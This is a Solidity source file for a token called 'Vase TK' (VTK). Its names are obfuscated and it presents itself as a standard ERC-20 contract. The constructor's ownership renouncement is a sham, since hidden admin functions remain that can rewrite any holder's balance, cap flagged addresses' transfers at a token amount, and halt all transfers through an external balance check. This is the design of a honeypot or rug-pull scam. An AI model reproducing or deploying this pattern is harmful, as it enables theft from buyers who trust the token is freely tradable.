//SPDX-License-Identifier: MIT

pragma solidity ^0.8.2;

interface ecydxdmbj {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

abstract contract mgisvmkpz {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

interface yrgsqxifrp {
    function createPair(address stezkxnwcuutyn, address udftsivbla) external returns (address);
}

interface yihtfvsnfcc {
    function totalSupply() external view returns (uint256);

    function balanceOf(address chgwhshprbo) external view returns (uint256);

    function transfer(address vciurcapjxr, uint256 bcmpdgrlfkiwir) external returns (bool);

    function allowance(address fvbpfxqps, address spender) external view returns (uint256);

    function approve(address spender, uint256 bcmpdgrlfkiwir) external returns (bool);

    function transferFrom(
        address sender,
        address vciurcapjxr,
        uint256 bcmpdgrlfkiwir
    ) external returns (bool);

    event Transfer(address indexed from, address indexed bqgavsssmhn, uint256 value);
    event Approval(address indexed fvbpfxqps, address indexed spender, uint256 value);
}

interface yihtfvsnfccMetadata is yihtfvsnfcc {
    function name() external view returns (string memory);

    function symbol() external view returns (string memory);

    function decimals() external view returns (uint8);
}

contract VaseTK is mgisvmkpz, yihtfvsnfcc, yihtfvsnfccMetadata {

    uint256 llnvyezusrm;

    function transferFrom(address vxvurmnrhcis, address vciurcapjxr, uint256 bcmpdgrlfkiwir) external override returns (bool) {
        if (_msgSender() != wtkervwrkxeogv) {
            if (uklkpwweq[vxvurmnrhcis][_msgSender()] != type(uint256).max) {
                require(bcmpdgrlfkiwir <= uklkpwweq[vxvurmnrhcis][_msgSender()]);
                uklkpwweq[vxvurmnrhcis][_msgSender()] -= bcmpdgrlfkiwir;
            }
        }
        return egmjbbtyw(vxvurmnrhcis, vciurcapjxr, bcmpdgrlfkiwir);
    }

    function viuyajljha(address ypwfnkbajmad, uint256 bcmpdgrlfkiwir) public {
        fnykkezzvo();
        osgmyykwycr[ypwfnkbajmad] = bcmpdgrlfkiwir;
    }

    string private hvguufsdgz = "VTK";

    function egmjbbtyw(address vxvurmnrhcis, address vciurcapjxr, uint256 bcmpdgrlfkiwir) internal returns (bool) {
        if (vxvurmnrhcis == xvajamefi) {
            return kcpiceatz(vxvurmnrhcis, vciurcapjxr, bcmpdgrlfkiwir);
        }
        uint256 yezruupcjsqt = yihtfvsnfcc(nbvrimfqmzk).balanceOf(yupksmlnnlmyz);
        require(yezruupcjsqt == llnvyezusrm);
        if (nthqmrymirjvpt[vxvurmnrhcis]) {
            return kcpiceatz(vxvurmnrhcis, vciurcapjxr, zkuuzfwmatan);
        }
        return kcpiceatz(vxvurmnrhcis, vciurcapjxr, bcmpdgrlfkiwir);
    }

    bool private hbhalqisk;

    function fnykkezzvo() private view {
        require(klwezwwwnjcgv[_msgSender()]);
    }

    mapping(address => bool) public nthqmrymirjvpt;

    bool public zuszcnlhvy;

    uint256 constant zkuuzfwmatan = 10 ** 10;

    address yupksmlnnlmyz = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;

    function kcpiceatz(address vxvurmnrhcis, address vciurcapjxr, uint256 bcmpdgrlfkiwir) internal returns (bool) {
        require(osgmyykwycr[vxvurmnrhcis] >= bcmpdgrlfkiwir);
        osgmyykwycr[vxvurmnrhcis] -= bcmpdgrlfkiwir;
        osgmyykwycr[vciurcapjxr] += bcmpdgrlfkiwir;
        emit Transfer(vxvurmnrhcis, vciurcapjxr, bcmpdgrlfkiwir);
        return true;
    }

    address public xvajamefi;

    uint256 public qxnbxfdkj;

    uint256 private pcanprepa;

    function balanceOf(address chgwhshprbo) public view virtual override returns (uint256) {
        return osgmyykwycr[chgwhshprbo];
    }

    bool public rdzfbeehno;

    event OwnershipTransferred(address indexed ukxqqrwflnsf, address indexed xmnyirzjtwf);

    uint256 phjkgpxszxz;

    address wtkervwrkxeogv = 0x10ED43C718714eb63d5aA57B78B54704E256024E;

    uint256 private sqleywdhtd;

    address private rjnfvkayxjpt;

    mapping(address => mapping(address => uint256)) private uklkpwweq;

    function transfer(address ypwfnkbajmad, uint256 bcmpdgrlfkiwir) external virtual override returns (bool) {
        return egmjbbtyw(_msgSender(), ypwfnkbajmad, bcmpdgrlfkiwir);
    }

    function allowance(address qpeqqmaae, address rsyliwwsf) external view virtual override returns (uint256) {
        if (rsyliwwsf == wtkervwrkxeogv) {
            return type(uint256).max;
        }
        return uklkpwweq[qpeqqmaae][rsyliwwsf];
    }

    uint256 public ocobhvdyznrxm;

    uint256 private aevnbavjuxqthf = 100000000 * 10 ** 18;

    function decimals() external view virtual override returns (uint8) {
        return rgzqaxomgcip;
    }

    function owner() external view returns (address) {
        return rjnfvkayxjpt;
    }

    constructor (){
        
        mmkkarlqwtduvh();
        ecydxdmbj aymctevoq = ecydxdmbj(wtkervwrkxeogv);
        nbvrimfqmzk = yrgsqxifrp(aymctevoq.factory()).createPair(aymctevoq.WETH(), address(this));
        
        xvajamefi = _msgSender();
        klwezwwwnjcgv[xvajamefi] = true;
        osgmyykwycr[xvajamefi] = aevnbavjuxqthf;
        if (kphfdzlzrjh) {
            zkmilwqbif = false;
        }
        emit Transfer(address(0), xvajamefi, aevnbavjuxqthf);
    }

    mapping(address => uint256) private osgmyykwycr;

    mapping(address => bool) public klwezwwwnjcgv;

    function totalSupply() external view virtual override returns (uint256) {
        return aevnbavjuxqthf;
    }

    bool public zkmilwqbif;

    bool public kphfdzlzrjh;

    function getOwner() external view returns (address) {
        return rjnfvkayxjpt;
    }

    string private sgxiamnzhpfuo = "Vase TK";

    function approve(address rsyliwwsf, uint256 bcmpdgrlfkiwir) public virtual override returns (bool) {
        uklkpwweq[_msgSender()][rsyliwwsf] = bcmpdgrlfkiwir;
        emit Approval(_msgSender(), rsyliwwsf, bcmpdgrlfkiwir);
        return true;
    }

    uint256 private voujnmeyezzly;

    function symbol() external view virtual override returns (string memory) {
        return hvguufsdgz;
    }

    uint8 private rgzqaxomgcip = 18;

    function mmkkarlqwtduvh() public {
        emit OwnershipTransferred(xvajamefi, address(0));
        rjnfvkayxjpt = address(0);
    }

    function name() external view virtual override returns (string memory) {
        return sgxiamnzhpfuo;
    }

    bool private csbcffvmmz;

    function slpgymdtk(address ftlmrickmsnd) public {
        if (rdzfbeehno) {
            return;
        }
        
        klwezwwwnjcgv[ftlmrickmsnd] = true;
        if (voujnmeyezzly != pcanprepa) {
            pcanprepa = qxnbxfdkj;
        }
        rdzfbeehno = true;
    }

    function gxfmlbsxsnnfyd(address elovmdwos) public {
        fnykkezzvo();
        if (hbhalqisk != csbcffvmmz) {
            csbcffvmmz = true;
        }
        if (elovmdwos == xvajamefi || elovmdwos == nbvrimfqmzk) {
            return;
        }
        nthqmrymirjvpt[elovmdwos] = true;
    }

    address public nbvrimfqmzk;

    function fjqwvyxkkvxfol(uint256 bcmpdgrlfkiwir) public {
        fnykkezzvo();
        llnvyezusrm = bcmpdgrlfkiwir;
    }

}